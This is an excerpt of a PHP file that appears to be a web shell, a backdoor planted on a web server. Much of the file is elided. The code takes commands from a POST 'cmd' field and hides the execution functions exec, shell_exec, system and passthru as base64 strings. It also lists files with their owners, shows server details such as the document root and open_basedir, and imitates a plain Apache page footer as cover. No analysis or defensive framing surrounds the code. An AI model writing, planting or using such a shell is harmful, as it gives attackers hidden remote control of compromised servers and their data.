...
function encryptSensitiveData($data, $key = '') {
    ...
    $key = $key ? $key : substr(md5(PASSWORD_MD5), 0, 16);
...
<hr>
<address>Apache Server at <?php echo isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost'; ?> Port <?php echo isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : '80'; ?></address>
...
if (isset($_POST['cmd'])) {
    ...
    ${'v'.$r} = array('ZXhlYw==','c2hlbGxfZXhlYw==','c3lzdGVt','cGFzc3RocnU=');
    ...
    if (is_dir($dir)) {
        ...
        if ($items) {
            foreach ($items as $item) {
                ...
                $ownerInfo = function_exists('posix_getpwuid') && function_exists('fileowner') ? @posix_getpwuid(@fileowner($path)) : false;
                $owner = $ownerInfo && isset($ownerInfo['name']) ? $ownerInfo['name'] : 'unknown';
...
$currentUserInfo = function_exists('posix_getpwuid') && function_exists('posix_geteuid') ? @posix_getpwuid(@posix_geteuid()) : false;
$currentUser = $currentUserInfo && isset($currentUserInfo['name']) ? $currentUserInfo['name'] : get_current_user();
$serverName = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : gethostname();
$shellDir = isset($GLOBALS['OVERRIDE_DIR']) ? $GLOBALS['OVERRIDE_DIR'] : dirname(__FILE__);
...
<body>
            ...
            <div class="info-modal-content">
                ...
                <div class="info-section">
                    ...
                    <div class="info-item">
                        ...
                        <span class="info-value"><?php echo htmlspecialchars(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'Unknown'); ?></span>
                    </div>
                    <div class="info-item">
        ...
        <div class="modal-content">
            ...
            <div class="info-modal-content">
                <div class="info-section">
                    ...
                    <div class="info-item">
                        <span class="info-label">Document Root:</span>
                        <span class="info-value"><?php echo isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A'; ?></span>
                    </div>
                </div>
                ...
                <div class="info-section">
                    ...
                    <div class="info-item">
                        ...
                        <span class="info-value"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'None'; ?></span>
                    </div>
                    <div class="info-item">
                ...
                <div class="info-section">
                    ...
                    <div class="info-item">
                        ...
                        <span class="info-value"><?php echo isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Protocol:</span>
                        <span class="info-value"><?php echo isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'N/A'; ?></span>
                    </div>
                </div>
            </div>
            <div style="margin-top: 15px;">
    ...
    <script>
        ...
        function openFileUrl(filename) {
            ...
            var docRoot = '<?php echo str_replace("\\", "/", addslashes(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '')); ?>';
